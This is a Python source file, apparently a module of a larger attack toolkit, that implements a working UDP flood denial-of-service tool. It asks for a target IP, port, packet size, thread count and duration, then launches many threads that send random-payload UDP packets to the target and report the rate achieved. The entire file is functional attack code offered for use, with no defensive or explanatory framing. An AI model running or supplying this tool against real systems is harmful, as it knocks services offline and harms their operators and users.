import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from swarm_core import c, C, banner, ask, pause

import random
import socket
import threading
import time


def run():
    banner("UDP FLOOD")
    host = ask("target ip", "127.0.0.1") or "127.0.0.1"
    port = int(ask("port", "80") or 80)
    size = int(ask("packet size", "1024") or 1024)
    threads = int(ask("threads", "50") or 50)
    secs = float(ask("duration (s)", "10") or 10)

    counter = {"sent": 0}
    stop = threading.Event()
    lock = threading.Lock()
    payload = random._urandom(size)

    def worker():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while not stop.is_set():
            try:
                s.sendto(payload, (host, port))
                with lock:
                    counter["sent"] += 1
            except Exception:
                pass

    ts = [threading.Thread(target=worker, daemon=True) for _ in range(threads)]
    print(c(f"  flooding {host}:{port}  ·  {threads} threads  ·  {secs}s", C.CY))
    for t in ts:
        t.start()
    time.sleep(secs)
    stop.set()
    for t in ts:
        t.join(timeout=2)

    rate = counter["sent"] / secs if secs else 0
    print(c(f"  {counter['sent']} packets sent (~{rate:.0f}/s)", C.G))
    pause()


if __name__ == "__main__":
    run()
